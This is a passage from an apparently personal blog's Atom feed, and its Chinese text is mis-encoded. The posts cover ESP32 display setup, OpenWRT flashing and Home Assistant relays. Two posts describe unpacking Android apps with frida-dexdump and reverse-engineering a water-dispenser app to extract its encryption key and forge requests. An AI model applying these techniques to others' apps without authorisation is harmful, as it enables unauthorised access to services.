      <![CDATA[<h2 id="ç¯å¢ƒéœ€æ±‚"><a href="#ç¯å¢ƒéœ€æ±‚">ç¯å¢ƒéœ€æ±‚</a></h2><ul><li>ESP32-S3-LCD-EV-BOARD</li><li><a href="https://squareline.io/" rel="nofollow noopener noreferrer external" target="_blank">SquareLine Stdio</a> v1.3.1</li><li>ESP-IDF v5.0.2</li></ul><h2 id="åˆ›å»ºé¡¹ç›®"><a href="#åˆ›å»ºé¡¹ç›®">åˆ›å»ºé¡¹ç›®</a></h2><ol><li>åœ¨ SquareLine Stdio çš„æ¬¢è¿èœå•ä¸­é€‰æ‹© Exampleï¼Œé€‰æ‹©ä»»æ„ä¸€ä¸ªç¤ºä¾‹é¡¹ç›®ï¼Œç‚¹å‡» creatï¼Œå¾…ç›¸å…³æ–‡ä»¶åŠ è½½å®Œæ¯•</li><li>æ‰“å¼€ flie é€‰é¡¹å¡çš„ Project setting ä¿®æ”¹ BOARD GROUP ä¸º Espressifï¼Œé€‰æ‹© å¼€å‘æ¿å‹å·å¹¶ä¿å­˜</li><li>åœ¨ Font Manager é€‰é¡¹å¡çš„ CREATFONT ä¸‹è¿›è¡Œ modify ä»¥é˜²æŠ¥é”™</li><li>åœ¨ Inspector é€‰é¡¹å¡çš„ STYLE(MAIN) ä¸‹ ç¡®å®šé¡¹ç›®çš„ Text Fontï¼Œä»¥ä¾¿ç¨åä¿®æ”¹</li><li>åœ¨ Export é€‰é¡¹å¡ä¸­å¯¼å‡ºé¡¹ç›®ï¼Œå…ˆ Creat Template project ç„¶åå† Export UI Files</li></ol><h2 id="ä¿®æ”¹-menuconfig"><a href="#ä¿®æ”¹-menuconfig">ä¿®æ”¹ Menuconfig</a></h2><h3 id="ä¿®æ”¹å­—ä½“"><a href="#ä¿®æ”¹å­—ä½“">ä¿®æ”¹å­—ä½“</a></h3><p>åœ¨ ESP-IDF ä¸­æ‰“å¼€é¡¹ç›® ä½¿ç”¨ <code>idf.py menuconfig</code> å‘½ä»¤<br>æœç´¢ <code>font 26</code> é€‰æ‹© LV_FONTMONTSERRAT_26(=n) â€œEnable Montserrat 26â€ å¯ç”¨åä¿å­˜</p><h3 id="è®¾ç½®-psram-ä¸º-120mhz"><a href="#è®¾ç½®-psram-ä¸º-120mhz">è®¾ç½® psram ä¸º 120MHz</a></h3><!-- HTML_TAG_START --><pre class="shiki material-default" md="true"><div class="language-id">md</div><div class='code-container'><code><div class='line'>1. æœç´¢ psram</div><div class='line'>2. é€‰æ‹© SPIRAM_MODE_OCT(=y) "Octal Mode PSRAM"</div><div class='line'>3. è¿›å…¥ Octal Mode PSRAM</div><div class='line'>4. è¿›å…¥ Set RAM clock speed</div><div class='line'>5. é€‰æ‹© 120MHz clock speed</div></code></div></pre><!-- HTML_TAG_END --><h3 id="è®¾ç½®-flash-ä¸º-120mhz"><a href="#è®¾ç½®-flash-ä¸º-120mhz">è®¾ç½® flash ä¸º 120MHz</a></h3><!-- HTML_TAG_START --><pre class="shiki material-default" md="true"><div class="language-id">md</div><div class='code-container'><code><div class='line'>1. æœç´¢ flash</div><div class='line'>2. é€‰æ‹© ESPTOOLPY_FLASHFREQ_120M(=n) "120MHz"</div><div class='line'>3. é€‰æ‹© 120MHz</div></code></div></pre><!-- HTML_TAG_END --><h3 id="è®¾ç½®-data-cache-line"><a href="#è®¾ç½®-data-cache-line">è®¾ç½® data cache line</a></h3><!-- HTML_TAG_START --><pre class="shiki material-default" md="true"><div class="language-id">md</div><div class='code-container'><code><div class='line'>1. æœç´¢ data cache line</div><div class='line'>2. é€‰æ‹© ESP_32S3_DATA_CACHE_LINE_64B(=n) "64 Bytes"</div><div class='line'>3. é€‰æ‹© 64Bytes</div></code></div></pre><!-- HTML_TAG_END --><h3 id="å¼€å¯é˜²æ’•è£‚æ¨¡å¼"><a href="#å¼€å¯é˜²æ’•è£‚æ¨¡å¼">å¼€å¯é˜²æ’•è£‚æ¨¡å¼</a></h3><!-- HTML_TAG_START --><pre class="shiki material-default" md="true"><div class="language-id">md</div><div class='code-container'><code><div class='line'>1. æœç´¢ avoid tearing effect</div><div class='line'>2. è¿›å…¥ BSP_DISPLAY_LVGL_AVOID_TEAR(=n) "Avoid tearing effect"</div><div class='line'>3. é€‰æ‹© Avoid tearing effect (NEW),è¿›å…¥ LCD</div><div class='line'>4. å¼€å¯ Enable to use double frame buffers ä»¥åŠ Enable to refresh LCD manually</div><div class='line'>5. è¿›å…¥ Displayï¼Œ å¼€å¯ Avoid tearing effect</div><div class='line'>6. è¿›å…¥ Select LVGL buffer modeï¼Œå¼€å¯ Direct mode</div></code></div></pre><!-- HTML_TAG_END --><h2 id="ç¼–è¯‘çƒ§å½•"><a href="#ç¼–è¯‘çƒ§å½•">ç¼–è¯‘çƒ§å½•</a></h2><p>åœ¨ ESP-IDF ä¸­ä½¿ç”¨ <code>idf.py build</code> ç¼–è¯‘åè¿›è¡Œçƒ§å½•</p>]]>
    </content>
    <category term="IoT" scheme="https://az0x01-blog.vercel.app/?tags=IoT" />
  </entry>
  <entry>
    <title type="html"><![CDATA[å°å¤©åŒå­¦ ç¬¬ä¸‰æ–¹ APP å¼€å‘]]></title>
    <link href="https://az0x01-blog.vercel.app/20230510" />
    <id>https://az0x01-blog.vercel.app/20230510</id>
    <published>2023-05-10T00:00:00.000Z</published>
    <updated>2023-05-15T00:00:00.000Z</updated>
    <content type="html">
      <![CDATA[<p>å®˜æ–¹ APP ä½¿ç”¨ä¸ä¾¿ äºæ˜¯æƒ³å¼€å‘ä¸€ä¸ªä½¿ç”¨æ›´ä¾¿æ·çš„ç¬¬ä¸‰æ–¹ APP <a href="https://github.com/aixiao0621/Duoheshui" rel="nofollow noopener noreferrer external" target="_blank">é¡¹ç›®åœ°å€</a></p><h2 id="app-é€†å‘"><a href="#app-é€†å‘">APP é€†å‘</a></h2><p>æŠ“åŒ… å‘ç° <code>data</code> æœ‰åŠ å¯† å°è¯•è§£å¯†å¤±è´¥ï¼Œè¯•å›¾å¯»æ‰¾æºç ä½¿ç”¨å·¥å…·<a href="https://github.com/hluwa/frida-dexdump" rel="nofollow noopener noreferrer external" target="_blank">frida-dexdump</a> è„±å£³ï¼Œä½†å¾—åˆ°çš„ä»£ç å¯è¯»æ€§å¾ˆä½ï¼Œå‘ç°æœ‰å°ç¨‹åºï¼Œäºæ˜¯è½¬æˆ˜</p><h2 id="å¾®ä¿¡å°ç¨‹åº-é€†å‘"><a href="#å¾®ä¿¡å°ç¨‹åº-é€†å‘">å¾®ä¿¡å°ç¨‹åº é€†å‘</a></h2><blockquote><p>åŸä»¥ä¸ºå°ç¨‹åºå’Œå¾®ä¿¡æœåŠ¡å™¨çš„æ²Ÿé€šåªæ˜¯ä¸ºäº†æ‹¿åˆ°æ‰‹æœºå·æ˜æ–‡ï¼Œäºæ˜¯æƒ³è¦ç›´æ¥ä½¿ç”¨å°ç¨‹åºçš„è¯·æ±‚æ–¹å¼å®Œæˆç™»å½•ç­‰å…¨éƒ¨æµç¨‹</p></blockquote><ul><li>ä½¿ç”¨å·¥å…· <a href="https://github.com/r3x5ur/unveilr" rel="nofollow noopener noreferrer external" target="_blank">unveilr</a> ç›´æ¥å¯¹<code>__APP__.wxapkg</code>è¿›è¡Œè§£åŒ…</li><li>ä½¿ç”¨<code>å¾®ä¿¡å¼€å‘è€…å·¥å…·</code>æ‰“å¼€è§£åŒ…åçš„æ–‡ä»¶å¹¶å°è¯•ç¼–è¯‘ï¼ŒæˆåŠŸ (å¥½è¿)</li><li>å°è¯•ä½¿ç”¨ Burpsuite å’Œ proxifier å¯¹ PC ç«¯å°ç¨‹åºæŠ“åŒ…ï¼Œå‚è€ƒäº†<a href="https://blog.csdn.net/weixin_45031612/article/details/127416319" rel="nofollow noopener noreferrer external" target="_blank">ç›¸å…³æ•™ç¨‹</a>,å¯»æ‰¾ç™»å½•è¯·æ±‚ï¼Œå‘ç°å’Œ APP æŠ“åˆ°çš„åŒ…æœ‰ç›¸åŒçš„åŠ å¯†</li><li>ç”±äºè§£åŒ…åçš„å°ç¨‹åºä»£ç æœ‰æ··æ·†ï¼Œå¯è¯»æ€§å·®ï¼Œäºæ˜¯ç›´æ¥è°ƒè¯•</li><li>å°ç¨‹åºçš„ä¸»è¦ JS ä»£ç ä½äºæ ¹ç›®å½•ä¸‹ï¼Œç”±äºå…¶ä¸­çš„å‡½æ•°å‡å£°æ˜äº† <code>&quot;use strict&quot;</code> æ‰€ä»¥å…ˆåˆ é™¤</li><li>æœç´¢åŠ å¯†å‡½æ•° ç›´æ¥ä½¿ç”¨<code>console.log</code>æ‰“å°ï¼Œåœ¨è°ƒè¯•å™¨é‡Œå¯¼å‡ºä¸ºå…¨å±€å˜é‡ å°±å¯ä»¥è¿›è¡ŒåŠ è§£å¯†æ“ä½œäº†</li><li>åœ¨æŸäº›æƒ…å†µä¸‹ï¼Œä¼šæç¤ºå­—ç¬¦ä¸²ä¸æ˜¯ UTF-8ï¼Œè¿™æ—¶å€™éœ€è¦å°† <code>\\/</code> æ”¹ä¸º <code>\/</code> å¯èƒ½è¿˜éœ€è¦å¢å‡ <code>=</code> çš„æ•°é‡</li><li>åˆ°è¿™é‡Œä»¥ä¸ºå·²ç»ç»“æŸäº†ï¼ŒæŠ“åˆ°çš„åŒ…å¯ä»¥ç›´æ¥è§£å‡ºï¼Œä½†æ˜¯è§£å¯†å°ç¨‹åºçš„ç™»å½•è¯·æ±‚åå‘ç°é‡Œé¢è¿˜æœ‰ä¸€å±‚åŠ å¯†ä¸”æ— æ³•ä½¿ç”¨åŒæ ·çš„è§£å¯†æ–¹å¼è§£å¯†</li><li>è§£å¯†çš„å¾®ä¿¡å°ç¨‹åºç™»å½•è¯·æ±‚åŒ…ä¸­å­˜åœ¨ä¸€ä¸ªåä¸º<code>code</code>çš„ key é€šè¿‡æŸ¥é˜…å¾®ä¿¡å¼€å‘è€…æ–‡æ¡£ï¼Œåˆ¤æ–­åº”è¯¥æ˜¯ä¸å¾®ä¿¡æœåŠ¡å™¨çš„äº¤æµä¸­æ‹¿åˆ°çš„ï¼Œå¥ˆä½•å¾®ä¿¡çš„æ•°æ®åŒ…åŠ å¯†ååˆ†æŠ½è±¡ï¼Œæ²¡æœ‰æ€è·¯æ‹¿åˆ° <code>code</code> äºæ˜¯æ€è·¯å†æ¬¡ä¸­æ–­</li></ul><h2 id="åˆå›åˆ°æœ€åˆçš„èµ·ç‚¹"><a href="#åˆå›åˆ°æœ€åˆçš„èµ·ç‚¹">åˆå›åˆ°æœ€åˆçš„èµ·ç‚¹ğŸµ</a></h2><ul><li>å¶ç„¶å‘ç°å°ç¨‹åºçš„è§£å¯†æ–¹å¼å¯¹ APP æŠ“åˆ°çš„åŒ…åŒæ ·é€‚ç”¨ï¼Œäºæ˜¯æŸ³æš—èŠ±æ˜ï¼Œæ‹¿åˆ°éªŒè¯ç ç™»å½•å’Œæ‰“å¼€é¥®æ°´æœºçš„è¯·æ±‚æ–¹å¼</li><li>ç°åœ¨åªéœ€è¦å¤ç°åŠ è§£å¯†å‡½æ•°å³å¯ï¼Œæ‰¾åˆ° <code>crypto-js</code> åº“ï¼Œå‘ç°å®Œå…¨ä¸€è‡´ï¼Œä»…éœ€çš„ä¸¤ä¸ªå‚æ•°ï¼šå¯†é’¥å’Œå¯†é’¥åç§»é‡ï¼Œä¹Ÿå†™åœ¨å°ç¨‹åºçš„æºç ä¸­</li></ul><blockquote><p>ä¸Šé¢æåˆ°çš„<code>code</code>åº”è¯¥æ˜¯å¾®ä¿¡æœåŠ¡ç«¯åŒæ—¶å‘é€åˆ°å°ç¨‹åºæœåŠ¡ç«¯å’Œå°ç¨‹åºå®¢æˆ·ç«¯ï¼Œä¸€èµ·å‘é€ç»™å°ç¨‹åºæœåŠ¡ç«¯çš„è¿˜æœ‰è¢«åŠ å¯†çš„æ‰‹æœºå·ï¼Œå°ç¨‹åºå®¢æˆ·ç«¯éœ€è¦ç”¨<code>code</code>æ‰èƒ½æ‹¿åˆ°æ˜æ–‡æ‰‹æœºå·</p></blockquote><h2 id="app-å¼€å‘"><a href="#app-å¼€å‘">APP å¼€å‘</a></h2><ul><li>åœ¨ä¼ªé€ è¯·æ±‚æ—¶è¦æ³¨æ„å‘é€æ•°æ®çš„ç¼–ç ç±»å‹</li><li>åœ¨æ–°ç‰ˆæœ¬ä¸­ï¼Œå¦‚æœè¦å‘é€ http è¯·æ±‚ï¼Œéœ€è¦åœ¨ <code>AndroidManifest.xml</code> çš„ <code>application</code> ä¸­ å¢åŠ  <code>android:usesCleartextTraffic=&quot;true&quot;</code></li><li>å¯èƒ½æ˜¯ç”±äºç¼–ç æ–¹å¼çš„é—®é¢˜ è¿”å›çš„å­—ç¬¦ä¸²æœ‰å¤šä½™çš„ <code>\&quot;</code> å’Œ <code>\\</code> å­—ç¬¦</li><li>åœ¨ kotlin ä¸­è¿›è¡Œè§£å¯†æ“ä½œæ—¶ï¼Œç”±äº <code>\\/</code> å­—ç¬¦çš„å‡ºç°ï¼Œéœ€è¦ä½¿ç”¨ä¸‰å±‚`<code>å¯¹æ•´ä½“å­—ç¬¦ä¸²è¿›è¡ŒåŒ…è£¹ï¼Œä½¿å…¶è½¬ä¸º </code>raw` åå†è¿›è¡Œæ›¿æ¢æ“ä½œ</li><li>æ›¿æ¢å­—ç¬¦ä¸²æ—¶ï¼Œkotlin çš„æ­£åˆ™è²Œä¼¼ä¸å¤§å¥½ç”¨</li></ul>]]>
    </content>
    <category term="Android" scheme="https://az0x01-blog.vercel.app/?tags=Android" />
    <category term="Rev" scheme="https://az0x01-blog.vercel.app/?tags=Rev" />
  </entry>
  <entry>
    <title type="html"><![CDATA[ä½¿ç”¨ frida å¯¹ APP è¿›è¡Œè„±å£³]]></title>
    <link href="https://az0x01-blog.vercel.app/20230401" />
    <id>https://az0x01-blog.vercel.app/20230401</id>
    <published>2023-04-01T00:00:00.000Z</published>
    <updated>2023-04-01T00:00:00.000Z</updated>
    <content type="html">
      <![CDATA[<h2 id="android-ç«¯çš„å‡†å¤‡"><a href="#android-ç«¯çš„å‡†å¤‡">Android ç«¯çš„å‡†å¤‡</a></h2><ol><li>åœ¨ <a href="https://github.com/frida/frida" rel="nofollow noopener noreferrer external" target="_blank">frida</a> ä»“åº“ä¸­ä¸‹è½½<code>frida-server</code>æ–‡ä»¶ï¼Œéœ€è¦ä¸æ‰‹æœºæ¶æ„å’Œ PC ç«¯ frida ç‰ˆæœ¬ç›¸å¯¹åº”ï¼Œè§£å‹åå¯ä»¥ä½¿ç”¨<code>adb push</code> åˆ°æ‰‹æœºï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨ <code>MTæ–‡ä»¶ç®¡ç†å™¨</code>ï¼Œå°†å…¶ç§»åŠ¨åˆ° <code>/data/local/tmp</code> ç›®å½•å†…ï¼Œèµ‹äºˆ <code>777</code> æƒé™</li><li>å°†æ‰‹æœºä¸ç”µè„‘è¿æ¥ï¼Œä½¿ç”¨ <code>adb devices</code> æŸ¥çœ‹è¿æ¥çš„è®¾å¤‡ï¼Œç¡®ä¿ adb æ­£ç¡®è¿æ¥</li></ol><h2 id="pc-ç«¯çš„å‡†å¤‡"><a href="#pc-ç«¯çš„å‡†å¤‡">PC ç«¯çš„å‡†å¤‡</a></h2><ol><li>ä½¿ç”¨ <code>pip install frida</code> å‘½ä»¤å®‰è£… <a href="https://github.com/frida/frida" rel="nofollow noopener noreferrer external" target="_blank">frida</a></li><li>ä½¿ç”¨ <code>pip install frida-tools</code> å‘½ä»¤å®‰è£… frida-tools  </li><li>ä½¿ç”¨<code>pip3 install frida-dexdump</code> å®‰è£… <a href="https://github.com/hluwa/FRIDA-DEXDump" rel="nofollow noopener noreferrer external" target="_blank">dexdump</a></li><li>åœ¨ cmd ä¸­æ‰§è¡Œä»¥ä¸‹å‘½ä»¤  </li></ol><!-- HTML_TAG_START --><pre class="shiki material-default" shell="true"><div class="language-id">shell</div><div class='code-container'><code><div class='line'>adb shell  </div><div class='line'>cd /data/local/tmp/  </div><div class='line'>su  </div><div class='line'>./frida-server-android...  </div></code></div></pre><!-- HTML_TAG_END --><h2 id="å¼€å§‹è„±å£³"><a href="#å¼€å§‹è„±å£³">å¼€å§‹è„±å£³</a></h2><ol><li>æ‰“å¼€æ–°çš„ cmd æ‰§è¡Œä»¥ä¸‹å‘½ä»¤ <code>frida-dexdump -U -f com.app.pkgname</code> å³å¯å¼€å§‹è„±å£³  </li><li>æ¨èåŠ ä¸Š <code>-d</code> å³æ·±åº¦æœç´¢ï¼Œç»“æœæ›´åŠ å®Œæ•´ï¼Œæ³¨æ„ <code>-f</code> åå¿…é¡»ç›´æ¥è·ŸåŒ…å</li></ol><h2 id="ä¿®å¤å’ŒæŸ¥çœ‹"><a href="#ä¿®å¤å’ŒæŸ¥çœ‹">ä¿®å¤å’ŒæŸ¥çœ‹</a></h2><ol><li>ç”Ÿæˆçš„é¡¹ç›®æ–‡ä»¶å­˜æ”¾åœ¨<code>C:\\Windows\\System32</code>ç›®å½•ä¸‹  </li><li>ä½¿ç”¨ MT ç®¡ç†å™¨è¿›è¡Œ dex ä¿®å¤  </li><li>ä½¿ç”¨ jadx æŸ¥çœ‹ä¿®å¤åçš„ dex æ–‡ä»¶  </li></ol>]]>
    </content>
    <category term="frida" scheme="https://az0x01-blog.vercel.app/?tags=frida" />
    <category term="Rev" scheme="https://az0x01-blog.vercel.app/?tags=Rev" />
  </entry>
  <entry>
    <title type="html"><![CDATA[ ä¸º J1900 å°ä¸»æœºåˆ·å†™ openWRT]]></title>
    <link href="https://az0x01-blog.vercel.app/20230305" />
    <id>https://az0x01-blog.vercel.app/20230305</id>
    <published>2023-03-05T00:00:00.000Z</published>
    <updated>2023-03-18T00:00:00.000Z</updated>
    <summary type="html"><![CDATA[å°½ç®¡å¹¶ä¸ç¨³å®šï¼Œä½†æŠ˜è…¾å°±å¯¹äº†]]></summary>
    <content type="html">
      <![CDATA[<h2 id="åˆ·å†™"><a href="#åˆ·å†™">åˆ·å†™</a></h2><ol><li>å‡†å¤‡ PE ç›˜ï¼šå¤åˆ¶å‡†å¤‡å¥½çš„ openwrt é•œåƒ (x86-64)ï¼Œï¼ˆä¸ºäº†æ–¹ä¾¿è¿™é‡Œé€‰æ‹©äº†æ•´åˆåŒ…ï¼‰å’Œåˆ·å†™å·¥å…· <a href="https://m0n0.ch/wall/physdiskwrite.php" rel="nofollow noopener noreferrer external" target="_blank">physdiskwrite</a> åˆ° PE ç›˜  </li><li>åˆ·å†™é•œåƒï¼šåœ¨ bios ä¿®æ”¹å¯åŠ¨é¡¹ï¼Œè¿›å…¥ PEï¼Œå°†åŸç£ç›˜æ ¼å¼åŒ–ä¸ºä¸€ä¸ªåˆ†åŒºï¼Œä½¿ç”¨ <code>physdiskwrite</code> å‘½ä»¤åˆ·å†™ï¼Œåœ¨ cmd ä¸­è¾“å…¥å‘½ä»¤ <code>.\physdiskwriter.exe -u &lt;é•œåƒè·¯å¾„&gt;</code> è¿›è¡Œåˆ·å†™</li><li>å¯åŠ¨ï¼šä¿®æ”¹å›åŸæ¥çš„å¯åŠ¨é¡¹å†å¯åŠ¨ï¼Œå°±å¯ä»¥è¿›å…¥ <code>openWRT</code></li></ol><h2 id="å…¶ä»–"><a href="#å…¶ä»–">å…¶ä»–</a></h2><ul><li>æ•´åˆåŒ…ä¸­è‡ªå¸¦äº† <code>openclash</code> ï¼Œå¯¼å…¥é…ç½®å³å¯ä½¿ç”¨ï¼Œå¦‚æœå®‰è£… <code>docker</code>ï¼Œåˆ™éœ€è¦ä½¿ç”¨ <code>TUNæ¨¡å¼</code></li><li>åœ¨ BIOS ä¸­è®¾ç½®é€šç”µè‡ªå¯æ˜¯å¿…è¦çš„  </li><li>åœ¨ä½¿ç”¨å·¥å…·åˆ·å†™æ—¶ï¼Œéœ€è¦é€‰æ‹©è¦åˆ·å†™çš„ç›˜ï¼Œè¯·ç¡®å®š<code>0</code>å’Œ<code>1</code>ä¸­å“ªä¸ªæ‰æ˜¯ç¡¬ç›˜ï¼Œç¡®å®šä¸äº†å°±å¤šè¯•å‡ æ¬¡å§ (æ‚²)  </li><li>ä¸‹è½½ä¸‹æ¥çš„é•œåƒå¯èƒ½éœ€è¦å¤šæ¬¡è§£å‹ï¼Œéœ€è¦çš„æ˜¯åˆ†ä¸º<code>0.img ...</code>çš„ä¸Šä¸€çº§  </li><li>è¿›å…¥ PE çš„æ–¹æ³•è¯·è‡ªè¡Œç™¾åº¦ï¼Œå°å¼æœºå¤§å¤šä¸ºå¼€æœºæ—¶æŒ‰ ESC åœ¨ <code>BIOS</code> ä¸­çš„ <code>BOOT</code> é€‰é¡¹ä¸­æ›´æ”¹å¯åŠ¨é¡¹ï¼Œå°† PE ç›˜æ”¾åœ¨ç¬¬ä¸€ä½ï¼Œä¿å­˜å¹¶é‡å¯  </li><li>openWRT åˆæ¬¡å¯åŠ¨åè¯·è®¾ç½®è´¦æˆ·å¯†ç   </li><li>æœåŠ¡é•¿æ—¶é—´ä¸é‡æ–°å¯åŠ¨å¯èƒ½ä¼šé€ æˆç½‘é€Ÿè¿‡æ…¢</li></ul>]]>
    </content>
    <category term="IoT" scheme="https://az0x01-blog.vercel.app/?tags=IoT" />
  </entry>
  <entry>
    <title type="html"><![CDATA[é€šè¿‡ Homeassistant æ§åˆ¶ç»§ç”µå™¨]]></title>
    <link href="https://az0x01-blog.vercel.app/20230113" />
    <id>https://az0x01-blog.vercel.app/20230113</id>
    <published>2023-01-13T00:00:00.000Z</published>
    <updated>2023-02-27T00:00:00.000Z</updated>
    <content type="html">
      <![CDATA[<h2 id="ç¯å¢ƒå®‰è£…"><a href="#ç¯å¢ƒå®‰è£…">ç¯å¢ƒå®‰è£…</a></h2><ol><li>ä½¿ç”¨<a href="https://github.com/AlexxIT/HassWP" rel="nofollow noopener noreferrer external" target="_blank">HassWP</a>ä½œä¸º homeassistant å®¢æˆ·ç«¯ã€‚</li><li>ä½¿ç”¨ ESPHome ä½œä¸ºè¿æ¥ ESP8266 ä¸ HA çš„å¹³å°ï¼Œç”±äº HassWP å¹¶ä¸æ˜¯ HA çš„å®Œå…¨ä½“ï¼Œæ‰€ä»¥è¿™é‡Œéœ€è¦å®‰è£…å®Œæ•´çš„ ESPHomeï¼Œè¿™é‡Œé€‰æ‹©å°†å…¶éƒ¨ç½²åœ¨ Liunx è™šæ‹Ÿæœºä¸Šã€‚</li><li>åœ¨å®‰è£… ESPHome å‰è¯·ç¡®ä¿ Liunx çš„ python å¤„äºè¾ƒé«˜ç‰ˆæœ¬ï¼Œè¿™é‡Œä½¿ç”¨äº† 3.11.1 ç‰ˆæœ¬ã€‚</li><li>ä½¿ç”¨ <code>pip3 install esphome</code> å‘½ä»¤å®‰è£… ESPHome;ä½¿ç”¨ <code>ln -s /home/coolcall/.local/bin/esphome /usr/local/bin/esphome</code> åˆ›å»º<del>è½¯è¿æ¥</del> ï¼›ä½¿ç”¨ <code>sudo esphome dashboard config/</code> è¿è¡Œã€‚</li></ol><h2 id="esp8266-æ¥å…¥-esphome"><a href="#esp8266-æ¥å…¥-esphome">ESP8266 æ¥å…¥ ESPHome</a></h2><ol><li>åœ¨ ESPHome çš„ç®¡ç†é¡µé¢ä¸­ï¼ˆå»ºè®®åœ¨ windows ç³»ç»Ÿä¸‹ä½¿ç”¨ Liunx IP åœ°å€çš„ 6052 ç«¯å£å·è®¿é—®ï¼Œè™šæ‹Ÿæœºä½¿ç”¨æ¡¥æ¥æ¨¡å¼ï¼‰ï¼Œç‚¹å‡»<code>NEW DEVICE</code> æ·»åŠ æ–°è®¾å¤‡ï¼Œè¾“å…¥<code>name</code> ï¼Œåœ¨é€‰æ‹©<code>ESP8266</code> å¹¶å‡ºç°<code>Configuration created!</code>åï¼Œå…ˆé€‰æ‹©<code>SKIP</code>ï¼Œç„¶ååœ¨é¡µé¢å³ä¸Šè§’çš„<code>SECRETS</code>å¤„é…ç½®ç½‘ç»œå¹¶ä¿å­˜ã€‚</li><li>å®Œæˆåæ‰“å¼€<code>EDIT</code>å¹¶è¿›è¡Œ<code>INSTALL</code>ï¼Œé€‰æ‹©ç¬¬å››ä¸ªï¼Œè¿™é‡Œæˆ‘é€‰æ‹©ä½¿ç”¨ ESP8266Flasher åˆ·å†™ä¸‹è½½çš„<code>.bin</code>ï¼ˆéœ€è¦å®‰è£… CH341 é©±åŠ¨ï¼‰ï¼Œå½“ç„¶ä½ ä¹Ÿå¯ä»¥é€‰æ‹©ä½¿ç”¨ ESPHome æä¾›çš„ web é¡µé¢è¿›è¡Œåˆ·å†™ã€‚è¿™é‡Œéœ€è¦ä¸‹è½½ç¼–è¯‘é“¾ï¼Œè¯·ä¿æŒè‰¯å¥½çš„ç½‘ç»œç¯å¢ƒå¹¶ç­‰å¾…ä¸€æ®µæ—¶é—´ã€‚</li><li>åˆ·å†™æˆåŠŸåï¼ŒESP8266 å°±å¯ä»¥è¿æ¥åˆ° ESPHome äº†ï¼Œé¡µé¢å°†ä¼šæ˜¾ç¤ºå›ºä»¶ä¸Šçº¿ï¼Œå†æ¬¡ç‚¹å‡»<code>EDIT</code>ï¼Œåœ¨<code>captive_portal:</code>åæ·»åŠ ä»¥ä¸‹ä»£ç ï¼š</li></ol><!-- HTML_TAG_START --><pre class="shiki material-default" yaml="true"><div class="language-id">yaml</div><div class='code-container'><code><div class='line'>web_server:</div><div class='line'>  port: 80</div><div class='line'></div><div class='line'>switch:</div><div class='line'>  - platform: gpio</div><div class='line'>    pin: GPIO0</div><div class='line'>    name: "ä¹¦æˆ¿ç¯"</div><div class='line'>    id: relay2</div><div class='line'>    inverted: True</div><div class='line'>    </div><div class='line'>binary_sensor:</div><div class='line'>  - platform: gpio</div><div class='line'>    pin: GPIO2</div><div class='line'>    name: "press_switch_lib1"</div><div class='line'>    device_class: opening</div><div class='line'>    filters:</div><div class='line'>      - delayed_on_off: 100ms #æ¶ˆæŠ–</div><div class='line'>    on_state:  #å½“è¿™ä¸ªäºŒè¿›åˆ¶ä¼ æ„Ÿå™¨çŠ¶æ€æ”¹å˜çš„æ—¶å€™ï¼Œè§¦å‘ gpio0</div><div class='line'>      then:</div><div class='line'>        - switch.toggle: relay2</div></code></div></pre><!-- HTML_TAG_END --><p>å†æ¬¡<code>INSTALL</code>æ—¶å³å¯é€‰æ‹©ç¬¬ä¸€ä¸ªé€‰é¡¹åˆ·å†™ã€‚</p><h2 id="åœ¨-ha-ä¸­æ·»åŠ å›ºä»¶"><a href="#åœ¨-ha-ä¸­æ·»åŠ å›ºä»¶">åœ¨ HA ä¸­æ·»åŠ å›ºä»¶</a></h2><ol><li>åœ¨ HA çš„é…ç½®é¢æ¿ä¸­é€‰æ‹©è®¾å¤‡ä¸æœåŠ¡ï¼Œåœ¨æ·»åŠ é›†æˆä¸­æœç´¢ ESPHomeï¼Œä¸»æœºåœ°å€éœ€è¦å¡«å†™ä¸Šæ–‡ä¸­çš„<code>NAME</code>ï¼Œåœ¨è¾“å…¥ key åå³å¯æ·»åŠ æˆåŠŸã€‚ï¼ˆkey å¯ä»¥åœ¨åˆ·å†™çš„<code>.yaml</code>æ–‡ä»¶ä¸­æ‰¾åˆ°ï¼‰</li></ol><h2 id="å…¶ä»–"><a href="#å…¶ä»–">å…¶ä»–</a></h2><p>WIFI çœç”µæ¨¡å¼ï¼š</p><!-- HTML_TAG_START --><pre class="shiki material-default" yaml="true"><div class="language-id">yaml</div><div class='code-container'><code><div class='line'>wifi:</div><div class='line'>  # ...</div><div class='line'>power_save_mode: light</div></code></div></pre><!-- HTML_TAG_END -->]]>
    </content>
    <category term="IoT" scheme="https://az0x01-blog.vercel.app/?tags=IoT" />
  </entry>
</feed>